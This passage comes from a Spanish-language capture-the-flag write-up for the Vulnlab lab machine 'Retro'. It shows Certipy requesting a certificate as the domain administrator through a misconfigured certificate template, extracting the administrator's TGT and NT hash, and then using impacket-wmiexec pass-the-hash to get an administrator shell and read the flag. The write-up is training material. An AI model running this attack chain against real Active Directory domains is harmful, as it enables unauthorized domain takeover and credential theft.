+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad req <span class="nt">-u</span> <span class="s1">'BANKING$'</span>@retro.vl <span class="nt">-p</span> Passwordxd1234 <span class="nt">-dc-ip</span> 10.10.121.174 <span class="nt">-ca</span> retro-DC-CA <span class="nt">-template</span> RetroClients <span class="nt">-upn</span> administrator@retro.vl <span class="nt">-key-size</span> 4096
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 10
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with UPN <span class="s1">'administrator@retro.vl'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved certificate and private key to <span class="s1">'administrator.pfx'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a autenticarnos para obtener le <strong>TGT</strong> este es un tipo de credencial que se utiliza en el protocolo <strong>Kerberos</strong> para autenticar a un usuario en un dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 10.10.121.174
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: administrator@retro.vl
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'administrator.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@retro.vl'</span>: <span class="k">********************************</span>:<span class="k">********************************</span>
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno ahora que tenemos el <strong>hash</strong> vamos a obtener un <strong>shell</strong> empleando <strong>Pass the Hash</strong> .</li>
+</ul>
+
+<h2 id="shell-as-administrator">Shell as administrator</h2>
+
+<ul>
+  <li>Y podemos en la misma ruta de siempre vemos la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-wmiexec administrator@10.10.121.174 <span class="nt">-hashes</span> <span class="k">********************************</span>:<span class="k">********************************</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
+<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+C:<span class="se">\&gt;</span><span class="nb">whoami
+</span>retro<span class="se">\a</span>dministrator
+C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\a</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+VL<span class="o">{</span><span class="k">************************</span><span class="o">}</span>
+C:<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/vulnlab/machines/2024/03/27/retro.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
